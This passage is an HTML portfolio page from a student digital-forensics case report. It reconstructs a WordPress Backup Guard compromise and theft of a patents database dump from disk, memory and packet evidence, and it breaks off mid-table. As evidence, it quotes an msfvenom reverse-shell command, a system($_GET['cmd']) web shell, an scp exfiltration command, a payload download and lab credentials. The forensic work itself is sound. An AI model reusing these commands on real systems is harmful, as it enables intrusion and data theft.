@@ -1,0 +1,625 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Enterprise DFIR Case Investigation — Kismat Kunwar</title>
+  <meta name="description" content="200-page digital forensics final case investigation into unauthorized access and database dump exfiltration at CompTech. Full artifact analysis across suspect workstation, victim server, and network captures.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Mono:wght@700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #ffffff;
+      --text: #0f172a;
+      --muted: #475569;
+      --accent: #1d4ed8;
+      --border: #e2e8f0;
+      --soft: #f8fafc;
+      --radius: 12px;
+      --code-bg: #f1f5f9;
+      --danger: #ef4444;
+      --danger-soft: #fef2f2;
+      --warning: #f59e0b;
+      --warning-soft: #fffbeb;
+      --success: #10b981;
+      --success-soft: #ecfdf5;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', system-ui, sans-serif; background: var(--bg); color: var(--text); line-height: 1.75; font-size: 16px; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ── HEADER ── */
+    .site-header { border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; justify-content: space-between; background: var(--soft); }
+    .site-header .logo { font-family: 'Space Mono', monospace; font-size: 17px; font-weight: 700; color: var(--text); }
+    .site-header nav a { color: var(--muted); font-size: 14px; font-weight: 600; margin-left: 20px; }
+    .site-header nav a:hover { color: var(--text); text-decoration: none; }
+
+    /* ── DOWNLOAD BANNER ── */
+    .dl-banner { background: #0f172a; color: #fff; padding: 12px 24px; display: flex; align-items: center; justify-content: center; gap: 16px; flex-wrap: wrap; }
+    .dl-banner span { font-size: 14px; color: #94a3b8; }
+    .dl-btn { display: inline-flex; align-items: center; gap: 8px; background: var(--accent); color: #fff; font-size: 14px; font-weight: 700; padding: 8px 20px; border-radius: 8px; text-decoration: none; }
+    .dl-btn:hover { background: #1e40af; text-decoration: none; }
+
+    /* ── HERO BAND ── */
+    .hero-band { background: var(--soft); border-bottom: 1px solid var(--border); padding: 44px 24px 38px; text-align: center; }
+    .hero-band .eyebrow { font-family: 'Space Mono', monospace; font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
+    .hero-band h1 { font-family: 'Space Mono', monospace; font-size: clamp(18px, 3vw, 26px); line-height: 1.35; margin-bottom: 16px; }
+    .meta-pills { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; margin-bottom: 18px; }
+    .meta-pill { font-size: 12px; font-weight: 600; padding: 4px 12px; border-radius: 999px; border: 1px solid var(--border); background: #fff; color: var(--muted); }
+    .tag-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; }
+    .tag { font-size: 12px; font-weight: 700; padding: 4px 12px; border-radius: 999px; background: #eef2ff; color: var(--accent); border: 1px solid #c7d2fe; }
+
+    /* ── LAYOUT ── */
+    .page { display: grid; grid-template-columns: 220px 1fr; gap: 40px; max-width: 1160px; margin: 0 auto; padding: 40px 24px 80px; align-items: start; }
+    @media (max-width: 760px) { .page { grid-template-columns: 1fr; } .toc-nav { display: none; } }
+
+    /* ── TOC ── */
+    .toc-nav { position: sticky; top: 24px; background: var(--soft); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; }
+    .toc-nav h4 { font-family: 'Space Mono', monospace; font-size: 12px; text-transform: uppercase; letter-spacing: 0.8px; color: var(--muted); margin-bottom: 12px; }
+    .toc-nav ol { list-style: decimal; padding-left: 16px; }
+    .toc-nav li { margin-bottom: 6px; }
+    .toc-nav a { font-size: 13px; font-weight: 600; color: var(--muted); }
+    .toc-nav a:hover { color: var(--accent); text-decoration: none; }
+
+    /* ── CONTENT ── */
+    .content h2 { font-family: 'Space Mono', monospace; font-size: 18px; margin: 40px 0 12px; padding-top: 8px; border-top: 2px solid var(--border); }
+    .content h3 { font-size: 15px; font-weight: 700; margin: 24px 0 8px; }
+    .content h4 { font-size: 14px; font-weight: 700; color: var(--muted); margin: 16px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; font-family: 'Space Mono', monospace; font-size: 11px; }
+    .content p { margin-bottom: 14px; }
+    .content ul, .content ol { padding-left: 22px; margin-bottom: 14px; }
+    .content li { margin-bottom: 5px; }
+    .content strong { font-weight: 700; }
+    .content hr { border: none; border-top: 1px solid var(--border); margin: 32px 0; }
+    .content code { font-family: 'Space Mono', monospace; font-size: 13px; background: var(--code-bg); border: 1px solid var(--border); padding: 1px 6px; border-radius: 4px; word-break: break-all; }
+
+    /* ── CALLOUTS ── */
+    .callout { border-left: 4px solid; border-radius: 0 var(--radius) var(--radius) 0; padding: 14px 16px; margin-bottom: 16px; }
+    .callout.info { background: #eff6ff; border-color: var(--accent); }
+    .callout.danger { background: var(--danger-soft); border-color: var(--danger); }
+    .callout.success { background: var(--success-soft); border-color: var(--success); }
+    .callout.warning { background: var(--warning-soft); border-color: var(--warning); }
+
+    /* ── TABLES ── */
+    .table-wrap { overflow-x: auto; margin-bottom: 20px; border-radius: var(--radius); border: 1px solid var(--border); }
+    table { width: 100%; border-collapse: collapse; font-size: 14px; }
+    thead { background: var(--soft); }
+    th { text-align: left; padding: 10px 14px; font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--muted); border-bottom: 1px solid var(--border); }
+    td { padding: 10px 14px; border-bottom: 1px solid var(--border); vertical-align: top; line-height: 1.55; }
+    tr:last-child td { border-bottom: none; }
+    tbody tr:hover { background: var(--soft); }
+
+    /* ── CARDS ── */
+    .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin-bottom: 24px; }
+    .card { background: var(--soft); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px; }
+    .card h3 { font-family: 'Space Mono', monospace; font-size: 13px; margin-bottom: 10px; color: var(--accent); }
+    .card ul { padding-left: 18px; font-size: 14px; }
+    .card li { margin-bottom: 4px; }
+
+    /* ── FIGURES ── */
+    .fig-wrap { margin: 20px 0 28px; }
+    .fig-wrap img { width: 100%; border-radius: 8px; border: 1px solid var(--border); display: block; }
+    .fig-wrap.half { max-width: 680px; }
+    figcaption { font-size: 13px; color: var(--muted); margin-top: 8px; font-style: italic; text-align: center; }
+
+    /* ── TIMELINE TABLE ── */
+    .timeline-event { font-family: 'Space Mono', monospace; font-size: 12px; white-space: nowrap; color: var(--accent); }
+    .badge { display: inline-block; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 999px; }
+    .badge.suspect { background: #fef3c7; color: #92400e; }
+    .badge.victim { background: #dbeafe; color: #1e40af; }
+    .badge.network { background: #d1fae5; color: #065f46; }
+    .badge.cross { background: #ede9fe; color: #5b21b6; }
+
+    /* ── FOOTER ── */
+    footer { text-align: center; padding: 20px; border-top: 1px solid var(--border); color: var(--muted); font-size: 13px; }
+  </style>
+</head>
+<body>
+
+<header class="site-header">
+  <span class="logo">Kismat Kunwar</span>
+  <nav>
+    <a href="/">← Portfolio</a>
+  </nav>
+</header>
+
+<div class="dl-banner">
+  <span>Full 200-page forensic report with all figures and artifact evidence</span>
+  <a class="dl-btn" href="assets/dfir-final-report.pdf" target="_blank" rel="noreferrer">⬇ Download Full Report (PDF)</a>
+</div>
+
+<div class="hero-band">
+  <p class="eyebrow">CSCI 6637-02 · Digital Forensics Final Case Investigation</p>
+  <h1>Enterprise DFIR Case Investigation<br>Unauthorized Access &amp; Database Exfiltration at CompTech</h1>
+  <div class="meta-pills">
+    <span class="meta-pill">Kismat Kunwar · Yash Chetanbhai Barot · Mazen Tarek Sayed</span>
+    <span class="meta-pill">Dr. Murat Gunestas</span>
+    <span class="meta-pill">May 4, 2026</span>
+  </div>
+  <div class="tag-row">
+    <span class="tag">Autopsy</span>
+    <span class="tag">Volatility</span>
+    <span class="tag">Wireshark / tshark</span>
+    <span class="tag">MFT / USN Journal</span>
+    <span class="tag">Windows EVTX</span>
+    <span class="tag">SRUM</span>
+    <span class="tag">Eric Zimmerman Tools</span>
+    <span class="tag">Memory Forensics</span>
+    <span class="tag">Pagefile Analysis</span>
+    <span class="tag">SHA-256 Integrity</span>
+    <span class="tag">Timeline Correlation</span>
+  </div>
+</div>
+
+<div class="page">
+
+  <!-- TOC SIDEBAR -->
+  <nav class="toc-nav">
+    <h4>Contents</h4>
+    <ol>
+      <li><a href="#case-overview">Case Overview</a></li>
+      <li><a href="#summary">Summary of Findings</a></li>
+      <li><a href="#tools">Tools &amp; Equipment</a></li>
+      <li><a href="#suspect">Suspect Workstation</a></li>
+      <li><a href="#victim">Victim Server</a></li>
+      <li><a href="#network">Network Captures</a></li>
+      <li><a href="#correlation">Cross-Source Correlation</a></li>
+      <li><a href="#conclusion">Conclusion &amp; Recommendations</a></li>
+    </ol>
+  </nav>
+
+  <article class="content">
+
+    <!-- ══ CASE OVERVIEW ══ -->
+    <h2 id="case-overview">Case Overview</h2>
+
+    <p>This report documents a completed digital forensic investigation into a suspected hack-and-leak incident at <strong>CompTech</strong>. An internal Windows Server 2019 host serving <code>projects.company.org</code> and <code>patents.company.org</code> was accessed without authorization. Both sites shared a MySQL-backed WordPress environment — unauthorized access therefore exposed restricted patent data alongside routine project content.</p>
+
+    <div class="card-grid">
+      <div class="card">
+        <h3>Suspect Host</h3>
+        <ul>
+          <li><strong>Hostname:</strong> DESKTOP-QPQJ3DK</li>
+          <li><strong>User:</strong> coelho (Coelho Harnagan)</li>
+          <li><strong>IP:</strong> 10.103.8.81 (DHCP)</li>
+          <li><strong>OS:</strong> Windows 10 Education 22H2</li>
+          <li><strong>Timezone:</strong> EST (UTC−4 DST)</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3>Victim Server</h3>
+        <ul>
+          <li><strong>Hostname:</strong> WIN-MU4SRPAR33J</li>
+          <li><strong>IP:</strong> 192.168.1.100</li>
+          <li><strong>OS:</strong> Windows Server 2019</li>
+          <li><strong>Services:</strong> Apache · WordPress · MySQL</li>
+          <li><strong>Sites:</strong> projects.company.org · patents.company.org</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3>Evidence Sources</h3>
+        <ul>
+          <li>Suspect disk image (E01) + memory dump</li>
+          <li>Victim disk image (E01) + memory dump</li>
+          <li>Network capture 1 (March 17–18, cleartext)</li>
+          <li>Network capture 2 (March 23, encrypted)</li>
+          <li>Suspect &amp; victim pagefile.sys</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3>Key Actors</h3>
+        <ul>
+          <li><strong>coelho</strong> — basic Projects CMS privileges</li>
+          <li><strong>hierro (10.103.8.72)</strong> — privileged WP admin targeted via credential lure</li>
+          <li><strong>Attack window:</strong> March 14–23, 2024</li>
+          <li><strong>Objective:</strong> MySQL database dump containing patent data</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="callout danger">
+      <strong>Central Forensic Question:</strong> Do the suspect workstation artifacts, victim server artifacts, and gateway packet captures together support unauthorized access and strongly corroborate database transfer from <code>192.168.1.100</code> to <code>10.103.8.81</code>? <strong>Answer: Yes.</strong>
+    </div>
+
+    <hr>
+
+    <!-- ══ SUMMARY OF FINDINGS ══ -->
+    <h2 id="summary">Summary of Findings</h2>
+
+    <p>The evidence supports a coherent intrusion sequence rather than isolated suspicious artifacts. Six core findings are established across all three evidence sources:</p>
+
+    <ol>
+      <li>The suspect workstation prepared and ran the full attack workflow — staged credential-lure infrastructure, WPScan reconnaissance, Metasploit exploitation, msfvenom payload generation, SSH receive preparation, and possession of <code>dump.sql</code>.</li>
+      <li>The victim server was compromised through the WordPress Backup Guard plugin path. Network capture 1 and victim artifacts show privileged login as <code>hierro</code>, upload of attacker-controlled PHP files, and repeated shell use from <code>10.103.8.81</code>.</li>
+      <li>The shell was used for interactive command execution — filesystem orientation, host and network checks, <code>wp-config.php</code> access — with command bodies visible in cleartext packet traffic.</li>
+      <li>Sensitive configuration was exposed and transfer was attempted. <code>wp-config.php</code> contents were visible through shell responses. Victim pagefile, PowerShell EVTX, and Volatility <code>cmdline</code> preserved <code>scp</code>/<code>ssh</code> activity toward <code>coelho@10.103.8.81</code>.</li>
+      <li>On March 23, the attacker staged <code>stg.exe</code> from the suspect host, executed it via the web shell, and established encrypted TCP/443 stream 139 from victim to suspect.</li>
+      <li><strong>The <code>dump.sql</code> transfer is strongly corroborated by cross-source timing and hash evidence</strong> — victim USN/MFT write completion → encrypted burst → suspect MFT receipt → identical SHA-256 hash on both hosts.</li>
+    </ol>
+
+    <hr>
+
+    <!-- ══ TOOLS ══ -->
+    <h2 id="tools">Tools &amp; Equipment</h2>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Category</th><th>Tool</th><th>Purpose</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Evidence mounting</td><td>Arsenal Image Mounter</td><td>Mount suspect and victim E01 images as logical volumes for artifact review</td></tr>
+          <tr><td>Forensic case platform</td><td>Autopsy 4.21 / 4.22</td><td>Case ingestion, data-source verification, web artifacts, registry artifacts, logical file ingest of pagefile and memdump</td></tr>
+          <tr><td>Integrity validation</td><td>Autopsy Integrity · <code>Get-FileHash</code></td><td>Confirm image integrity and validate cross-host SHA-256 match for <code>dump.sql</code></td></tr>
+          <tr><td>Host artifact parsing</td><td>Eric Zimmerman Tools (EZTools)</td><td>MFT, USN Journal, Prefetch, EVTX, Registry, Amcache, ShellBags, SRUM — parsed to CSV/JSON</td></tr>
+          <tr><td>File-system timeline</td><td>MFTECmd · USN Journal</td><td>Reconstruct file creation, modification, write-completion timing for attacker tools and <code>dump.sql</code></td></tr>
+          <tr><td>Program execution</td><td>PECmd · Amcache · Autopsy Recent Activity</td><td>Corroborate execution of Python, WPScan/Ruby, Metasploit, Nmap, PowerShell, <code>stg.exe</code></td></tr>
+          <tr><td>Event log review</td><td>EvtxECmd · Event Viewer</td><td>PowerShell, Defender, and System event logs for command execution and detection events</td></tr>
+          <tr><td>Registry review</td><td>Registry Explorer · RECmd</td><td>Hostname, timezone, network interface, DHCP configuration, user context</td></tr>
+          <tr><td>User activity</td><td>RecentLNK · JumpLists · ShellBags · SRUM</td><td>File access, folder navigation, program activity — corroborative, not primary</td></tr>
+          <tr><td>Browser artifacts</td><td>Autopsy Web History / Downloads / Cookies / Cache</td><td>Exploit-script downloads, WordPress activity, target access timeline</td></tr>
+          <tr><td>Memory forensics</td><td>Volatility</td><td>Process ancestry (<code>pstree</code>), command lines (<code>cmdline</code>), network sockets (<code>netscan</code>)</td></tr>
+          <tr><td>Pagefile / raw content</td><td>bulk_extractor · strings</td><td>Residual URLs, credentials, shell paths, command fragments from pagefile and memory</td></tr>
+          <tr><td>Network packet analysis</td><td>Wireshark</td><td>WordPress login, Backup Guard uploads, shell traffic, stg.exe staging, Stream 139 analysis</td></tr>
+          <tr><td>Packet CLI</td><td>tshark</td><td>Reproducible packet queries, byte-direction calculation for Stream 139</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr>
+
+    <!-- ══ SUSPECT WORKSTATION ══ -->
+    <h2 id="suspect">Suspect Workstation Analysis</h2>
+    <p>All suspect-side findings were validated across disk artifacts first, then corroborated with memory, pagefile, and browser evidence. The workstation was attributed to <strong>Coelho Harnagan</strong> at <code>DESKTOP-QPQJ3DK / 10.103.8.81</code>.</p>
+
+    <h3>Credential Harvesting Infrastructure</h3>
+    <p>Before exploitation, the suspect built a local credential-capture system targeting the privileged WordPress user <code>hierro</code>:</p>
+    <ul>
+      <li><code>srv.py</code> — Python HTTP handler that printed POSTed credential data, confirmed by PYTHON.EXE Prefetch loading <code>srv.py</code> and repeated <code>python .\srv.py</code> entries in <code>ConsoleHost_history.txt</code></li>
+      <li><code>login\index.html</code> — clone of <code>projects.company.org/wp-login.php</code> with form action altered to submit to <code>http://project.company.org/index.html</code></li>
+      <li><strong>LAN Messenger delivery</strong> — <code>messenger.db</code> and <code>lmc_1710537907019.log</code> show coelho messaging <code>hierro@10.103.8.72</code>, sending the lure URL, and discussing projects blog vs. patents access restrictions</li>
+      <li><code>Desktop\hierro.txt</code> — plaintext note: <code>hierro - ktbFZ%25PoRZA5KQb ---projects blog pass</code>, created 2024-03-17 20:11:12 UTC</li>
+      <li>Notepad++ backup of <code>hierro.txt</code> at <code>2024-03-17 21:07:32 UTC</code> — confirms later reopening</li>
+    </ul>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/coelhocontentpwfromdesktop.png" alt="hierro.txt credential note content on suspect desktop">
+      <figcaption>hierro.txt plaintext credential note recovered from suspect Desktop — establishes credential possession before exploitation</figcaption>
+    </div>
+
+    <h3>Exploit Research &amp; Tool Acquisition</h3>
+    <p>Browser artifacts and Autopsy Web Downloads establish a deliberate exploit-research sequence on March 17, 2024:</p>
+    <ul>
+      <li>Google search: <code>exploit for wordpress-popular-posts</code> at 20:24:56 UTC</li>
+      <li><code>50129.py</code> downloaded from Exploit-DB at 20:25:20 UTC</li>
+      <li>Rapid7 Backup Guard module browsed at 21:09:27 UTC</li>
+      <li><code>50093.py</code> downloaded from Exploit-DB at 21:09:50 UTC</li>
+      <li>Earlier tool installs: <code>metasploitframework-latest.msi</code> (March 14), <code>rubyinstaller-devkit-3.2.3-1-x64.exe</code> (March 14), <code>nmap-7.94-setup.exe</code> (March 17)</li>
+    </ul>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/exploitresearch-web.png" alt="Browser history showing exploit research sequence">
+      <figcaption>Autopsy Web History — exploit research sequence: WordPress Popular Posts, Exploit-DB 50129, Rapid7 Backup Guard, Exploit-DB 50093</figcaption>
+    </div>
+
+    <h3>WordPress Reconnaissance (WPScan)</h3>
+    <p>The suspect ran authenticated WPScan enumeration against <code>projects.company.org</code> using the harvested credential:</p>
+    <ul>
+      <li><code>wpscan --url http://projects.company.org --enumerate vp --enumerate vt</code></li>
+      <li><code>wpscan -U hierro -P ktbFZ%25PoRZA5KQb</code> — authenticated scan with hierro's credential</li>
+      <li>WPScan burst at 21:01:12 UTC requested <code>readme.txt</code> across plugin and theme directories in under one second — confirmed in Network Capture 1</li>
+      <li>RUBY.EXE Prefetch: RunCount 14, LastRun 20:46:40, loading WPSCAN-3.8.25 gem paths</li>
+      <li>Metasploit history shows: <code>search scanners</code> → <code>use auxiliary/scanner/http/wordpress_scanner</code> → <code>set RHOSTS projects.company.org</code> → <code>search backup</code></li>
+    </ul>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/consolehistorywpscan.png" alt="Console history showing WPScan commands">
+      <figcaption>ConsoleHost_history.txt — WPScan plugin/theme enumeration and authenticated scan commands</figcaption>
+    </div>
+
+    <h3>Exploitation — Backup Guard RCE</h3>
+    <p>The confirmed exploitation path was through the WordPress Backup Guard plugin using <code>50093.py</code>:</p>
+    <ul>
+      <li><code>.msf4\history</code> shows: <code>exploit/multi/http/wp_plugin_backup_guard_rce</code> configured with <code>set USERNAME hierro</code>, <code>set PASSWORD ktbFZ%PoRZA5KQb</code>, Meterpreter handler setup, and <code>session 1</code></li>
+      <li>PCAP-1 frame 7630 matched the 50093.py Firefox/Linux user-agent, multipart boundary, Backup Guard import endpoint, and <code>shell.php</code> upload body — HTTP 200 response confirmed</li>
+      <li>PYTHON.EXE Prefetch loaded both <code>50093.py</code> and <code>50129.py</code> (RunCount 13, executions March 17 and March 23)</li>
+      <li><code>50129.py</code> explicitly references <code>http://project.company.org/shll.gif.php</code> — confirms separate shell payload for the Popular Posts exploit path</li>
+    </ul>
+
+    <h3>Payload Generation — stg.exe</h3>
+    <p>The Meterpreter stager was deliberately generated to evade detection:</p>
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/consolehistorymsfvenomstgexe.png" alt="msfvenom command in console history">
+      <figcaption>ConsoleHost_history.txt — full msfvenom command: <code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.103.8.81 LPORT=443 -f exe -o stg.exe -e x64/xor_dynamic</code></figcaption>
+    </div>
+    <ul>
+      <li>MFT record: <code>stg.exe</code> in <code>\Users\coelho\Downloads\login</code>, size 251,904 bytes</li>
+      <li>Created: <code>2024-03-23T04:06:27 UTC</code>, LastAccess: <code>2024-03-23T04:08:50 UTC</code></li>
+      <li><code>x64/xor_dynamic</code> encoder selected — deliberate AV evasion</li>
+    </ul>
+
+    <h3>SSH Receive Preparation</h3>
+    <ul>
+      <li><code>authorized_keys</code> written at <code>2024-03-21 05:16:18 UTC</code> — single <code>ssh-ed25519</code> entry for <code>coelho@DESKTOP-QPQJ3DK</code></li>
+      <li>Volatility <code>netscan</code>: <code>sshd.exe</code> listening on <code>0.0.0.0:22</code> at <code>2024-03-21 05:17:22 UTC</code> — 64 seconds later</li>
+      <li>Prepared exactly two days before victim-side <code>scp coelho@10.103.8.81</code> activity on March 23</li>
+    </ul>
+
+    <h3>Memory &amp; Pagefile Corroboration</h3>
+    <p>Volatility analysis of the suspect memory dump corroborated all disk-based findings with live-state evidence:</p>
+    <div class="card-grid">
+      <div class="card">
+        <h3>cmdline Plugin</h3>
+        <ul>
+          <li>Active: <code>lmc.exe</code> (LAN Messenger)</li>
+          <li>Active: <code>sshd.exe</code></li>
+          <li>Active: <code>python.exe .\srv.py</code></li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3>pstree Plugin</h3>
+        <ul>
+          <li><code>explorer.exe → powershell.exe → python.exe</code></li>
+          <li><code>conhost.exe</code> beneath powershell</li>
+          <li>Confirms interactive console launch</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h3>netscan Plugin</h3>
+        <ul>
+          <li><code>lmc.exe</code> → <code>0.0.0.0:50000</code> at 2024-03-15 21:25 UTC</li>
+          <li><code>python.exe</code> → <code>0.0.0.0:80</code> at 2024-03-23 04:06 UTC</li>
+          <li><code>sshd.exe</code> → <code>0.0.0.0:22</code> at 2024-03-21 05:17 UTC</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="fig-wrap">
+      <img src="assets/images/dfir/cmdlineplugin.png" alt="Volatility cmdline plugin output for suspect memory">
+      <figcaption>Volatility cmdline — active processes: lmc.exe (LAN Messenger), sshd.exe, python.exe running srv.py</figcaption>
+    </div>
+    <div class="fig-wrap">
+      <img src="assets/images/dfir/pstree.png" alt="Volatility pstree showing process ancestry">
+      <figcaption>Volatility pstree — explorer.exe → powershell.exe → python.exe (srv.py) confirms interactive console launch of the credential-capture server</figcaption>
+    </div>
+    <div class="fig-wrap">
+      <img src="assets/images/dfir/netscanplugin.png" alt="Volatility netscan output showing listening services">
+      <figcaption>Volatility netscan — LAN Messenger, Python HTTP server on port 80, and sshd all listening during the attack window</figcaption>
+    </div>
+
+    <p>Pagefile bulk_extractor review returned: <code>Host: projects.company.org</code>, <code>Host: project.company.org</code>, <code>Referer: http://projects.company.org</code>, partial <code>log=hierro&amp;pwd=</code> form residue, <code>http://projects.company.org/wp-content/uploads/backup-guard/shell.php</code>, and <code>wp_plugin_backup_guard_rce</code> — all corroborating the established disk, memory, and network picture without introducing new theories.</p>
+
+    <h3>dump.sql on Suspect Host</h3>
+    <p>An Autopsy keyword-search pivot on <code>http://patents.company.org</code> surfaced a SQL dump under <code>C:\Windows\System32\dump.sql</code>:</p>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/autopsypatentkeyword.png" alt="Autopsy keyword search result for patents.company.org">
+      <figcaption>Autopsy keyword pivot on patents.company.org — surfaces dump.sql in the suspect Windows\System32 directory</figcaption>
+    </div>
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/dumpsql-mftrecord.png" alt="MFT record for dump.sql on suspect host">
+      <figcaption>MFT record — dump.sql size 5,083,961 bytes, LastModified 2024-03-23 04:18:26 UTC, Created 2024-03-23 04:19:21 UTC</figcaption>
+    </div>
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/dumpsql-usnactivity.png" alt="USN Journal activity for dump.sql">
+      <figcaption>USN Journal — FileCreate and DataExtend entries for dump.sql through 04:19:23 UTC on the suspect host</figcaption>
+    </div>
+
+    <p>Content review confirmed: <code>http://patents.company.org/wp-admin/</code>, published <em>Secret Patents</em> post, attachment <code>patent-front-page.png</code>, and <code>wp_users</code> table data tied to <code>patents.company.org</code>. The MySQL dump header read: <code>-- MySQL dump 10.13 Distrib 8.0.36, for Win64 (x86_64)</code>.</p>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/dump.sqlheader.png" alt="dump.sql MySQL header">
+      <figcaption>dump.sql header — MySQL 8.0.36 Win64 dump, consistent with generation on the victim Windows Server</figcaption>
+    </div>
+
+    <hr>
+
+    <!-- ══ VICTIM SERVER ══ -->
+    <h2 id="victim">Victim Server Analysis</h2>
+    <p>The victim server <code>WIN-MU4SRPAR33J</code> at <code>192.168.1.100</code> ran Apache, WordPress, and MySQL serving both <code>projects.company.org</code> and <code>patents.company.org</code> from a shared database backend.</p>
+
+    <h3>Shell Placement via Backup Guard</h3>
+    <p>Victim Apache logs, MFT records, and Defender EVTX confirm PHP shell artifacts were placed in the Backup Guard upload path:</p>
+    <ul>
+      <li><code>xegsd.php</code> and <code>shell.php</code> uploaded via Backup Guard administrative workflow</li>
+      <li>Apache access log shows repeated POST requests to <code>shell.php</code> from <code>10.103.8.81</code></li>
+      <li><code>shell.php</code> implemented <code>system($_GET['cmd'])</code> — direct OS command execution</li>
+    </ul>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/25-AcessLog-shellPHP.png" alt="Apache access log showing shell.php requests">
+      <figcaption>Victim Apache access log — repeated shell.php POST requests from 10.103.8.81</figcaption>
+    </div>
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/26-shellPHP-Code.png" alt="shell.php source code">
+      <figcaption>shell.php source — <code>system($_GET['cmd'])</code> implementing direct OS command execution</figcaption>
+    </div>
+
+    <h3>wp-config.php Exposure &amp; SCP Attempt</h3>
+    <p>Shell commands visible in cleartext Network Capture 1 returned <code>wp-config.php</code> contents over HTTP:</p>
+    <ul>
+      <li><code>DB_NAME = blog</code></li>
+      <li><code>DB_USER = root</code></li>
+      <li><code>DB_PASSWORD = CSCI3338.</code></li>
+      <li><code>DB_HOST = localhost</code></li>
+    </ul>
+    <p>Victim PowerShell EVTX Event ID 600 at <code>2024-03-18 07:14:10 UTC</code> logged: <code>sshpass scp wp-config.php coelho@10.103.8.81</code>. Victim pagefile and Volatility <code>cmdline</code> preserved the same command. No received <code>wp-config.php</code> was recovered on the suspect host — reported as <strong>attempted transfer</strong>.</p>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/28-SCP-wpConfig.png" alt="PowerShell EVTX showing scp wp-config.php command">
+      <figcaption>Victim PowerShell EVTX Event ID 600 — sshpass scp wp-config.php toward coelho@10.103.8.81</figcaption>
+    </div>
+
+    <h3>stg.exe Staging &amp; Defender Detection</h3>
+    <p>On March 23, the attacker used the existing shell to download and execute the staged Meterpreter payload:</p>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/30-InvokeWebRequest-stgexe.png" alt="PowerShell Invoke-WebRequest for stg.exe">
+      <figcaption>Victim PowerShell EVTX — Invoke-WebRequest downloading stg.exe from http://10.103.8.81/stg.exe (HTTP 200, 251,904 bytes)</figcaption>
+    </div>
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/32-WindowsDefenderFlagging-stgexe.png" alt="Windows Defender detection of stg.exe">
+      <figcaption>Victim Defender Operational EVTX — Meterpreter DLL detection at 2024-03-23 09:03:34 UTC, corroborated by SRUM activity</figcaption>
+    </div>
+
+    <h3>dump.sql on Victim Host</h3>
+    <ul>
+      <li>Root-level <code>C:\dump.sql</code> — created and written immediately before the March 23 network burst</li>
+      <li>USN Journal: <code>FileCreate 2024-03-23 04:17:44 UTC</code> → write completion <code>04:18:26 UTC</code></li>
+      <li>Size: 5,083,961 bytes — identical to suspect-side copy</li>
+      <li>Content confirmed: patents-site WordPress database material</li>
+    </ul>
+
+    <div class="fig-wrap half">
+      <img src="assets/images/dfir/35-dumpSQL-FileContent.png" alt="dump.sql content showing patents data">
+      <figcaption>dump.sql content review on victim — patents.company.org WordPress content, Secret Patents post, wp_users table</figcaption>
+    </div>
+
+    <h3>Victim Memory Forensics</h3>
+    <div class="fig-wrap">
+      <img src="assets/images/dfir/47-memforensicspluginmemdumppstree.png" alt="Victim Volatility pstree">
+      <figcaption>Victim Volatility pstree — Apache-spawned process ancestry tying cmd.exe, powershell.exe, scp.exe, and ssh.exe to shell-driven execution rather than ordinary administration</figcaption>
+    </div>
+
+    <hr>
+
+    <!-- ══ NETWORK ══ -->
+    <h2 id="network">Network Capture Analysis</h2>
+
+    <h3>Capture 1 — March 17–18: Cleartext Web Compromise Phase</h3>
+    <p>This capture preserved the complete web-compromise sequence in cleartext HTTP:</p>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Timestamp (UTC)</th><th>Event</th><th>Evidence</th></tr></thead>
+        <tbody>
+          <tr><td class="timeline-event">2024-03-17 21:01:12</td><td>WPScan burst — <code>readme.txt</code> requests across all plugin/theme dirs in &lt;1 second</td><td>tshark <code>http.request.uri contains "readme.txt"</code> + suspect WPScan cache</td></tr>
+          <tr><td class="timeline-event">2024-03-17 21:08:27</td><td>Cleartext POST to <code>wp-login.php</code> — server returned HTTP 302 with WordPress auth cookies for <code>hierro</code></td><td>PCAP-1 login POST + Set-Cookie response</td></tr>
